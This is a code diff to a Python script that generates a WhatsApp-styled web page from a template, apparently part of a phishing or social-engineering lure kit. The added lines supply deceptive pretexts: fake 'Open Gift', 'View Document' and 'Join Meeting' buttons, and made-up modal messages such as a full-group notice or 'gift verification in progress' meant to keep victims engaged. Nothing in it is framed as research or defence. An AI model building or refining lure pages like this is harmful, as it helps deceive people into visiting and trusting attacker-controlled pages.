@@ -66,6 +66,24 @@ else:
 img_type = 'image/png' if ((img_name and img_name.lower().endswith('.png')) or image.lower().endswith('.png')) else 'image/jpeg'
 site_name = os.getenv('SITENAME') or ('Gift Notification' if 'gift' in title.lower() else 'Direct Share')
 
+btn_text = os.getenv('BTN_TEXT')
+if not btn_text:
+    if 'gift' in title.lower():
+        btn_text = '🎁 Open Gift'
+    elif any(w in title.lower() for w in ['document', 'file', 'asset']):
+        btn_text = '📄 View Document'
+    elif 'meeting' in title.lower() or 'zoom' in title.lower():
+        btn_text = '📹 Join Meeting'
+    else:
+        btn_text = 'Join Chat'
+
+modal_msg = os.getenv('MODAL_MSG')
+if not modal_msg:
+    if 'gift' in title.lower():
+        modal_msg = 'Gift verification in progress. Please check back shortly!'
+    else:
+        modal_msg = 'Maximum group capacity of 256 participants reached'
+
 with open('template/whatsapp/index_temp.html', 'r') as index_temp:
     code = index_temp.read()
     if os.getenv("DEBUG_HTTP"):
@@ -75,6 +93,8 @@ with open('template/whatsapp/index_temp.html', 'r') as index_temp:
     code = code.replace('$OG_IMAGE$', og_image)
     code = code.replace('$OG_IMAGE_TYPE$', img_type)
     code = code.replace('$SITE_NAME$', site_name)
+    code = code.replace('$BTN_TEXT$', btn_text)
+    code = code.replace('$MODAL_MSG$', modal_msg)
     code = code.replace('$IMAGE$', 'images/{}'.format(img_name))
 
 with open('template/whatsapp/index.html', 'w') as new_index:
